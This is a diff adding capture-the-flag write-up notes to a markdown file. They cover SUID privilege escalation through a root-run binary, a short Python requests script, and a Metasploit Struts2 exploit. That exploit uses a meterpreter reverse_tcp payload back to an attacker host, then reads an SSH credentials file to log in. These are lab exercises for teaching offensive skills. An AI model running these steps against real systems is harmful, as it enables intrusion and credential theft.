@@ -193,16 +193,125 @@ After scanning initially, we get the following results:
 ## SUID Shenanigans
 
 ```shell
+#nmap scan
+nmap -T4 -p- -A 10.10.132.91
+#gives ssh port
+
+#ssh login using given creds
+ssh holly@10.10.132.91 -p 65534
+
+whoami
+#logged in as holly, low privileged user
+
+cd /home/igor
+#flag1.txt is there, but we cannot read it
+
+find flag1.txt -exec whoami \;
+#shows that find is executed by igor
+#we can try gtfobins for suid related binaries
+
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+#gives suid files
+#lists a binary called system-control
+
+/usr/bin/system-control
+#this executes commands as root
+#cat /home/igor/flag1.txt - prints flag1
+#so, we can launch a shell as root here and get flag2
+#/bin/bash
 ```
 
 ## Requests
 
-```shell
+```markdown
+Given, we have 10.10.169.100 at port 3000
+
+We have to use Python for scripting with the help of Requests library
+
+This gives us the flag 'sCrIPtKiDd'
+```
+
+```python
+import requests
+
+host = 'http://10.10.169.100:3000'
+
+while (host is not ''):
+    response = requests.get(host)
+    print("\n\nResponse")
+    print(response)
+    status_code = response.status_code
+    print("\n\nStatus Code")
+    print(status_code)
+    json_response = response.json()
+    print("\n\nJson response")
+    print(json_response)
+    converted_response = json_response.encode('ascii')
+    print("\n\nConverted response")
+    print(converted_response)
+    text = response.text
+    print("\n\nText")
+    print(text)
+    host = ''
 ```
 
 ## Metasploit-a-ho-ho-ho
 
 ```shell
+#given, we have a vulnerable system
+#using Metasploit, we have to gain access
+msfconsole
+
+search struts2
+
+use exploit/multi/http/struts2_content_type_ognl
+
+show options
+
+set RHOSTS 10.10.7.166
+
+set LHOST 10.17.48.136
+
+show options
+
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+
+set RPORT 80
+
+set TARGETURI /showcase.action
+
+run
+#this gives us access
+
+pwd
+
+#flag1 can be found in webapps directory
+
+cd webapps/ROOT
+
+ls
+
+cat ThisIsFlag1.txt
+#gives flag1
+
+cd /
+
+cd home/santa
+
+ls
+
+cat ssh-creds.txt
+#gives ssh creds
+
+ssh santa@10.10.7.166
+#santa access
+
+ls -la
+
+nl naughty-list.txt
+#prints file content with line numbered
+
+nl nice-list.txt
 ```
 
 ## Elf Applications
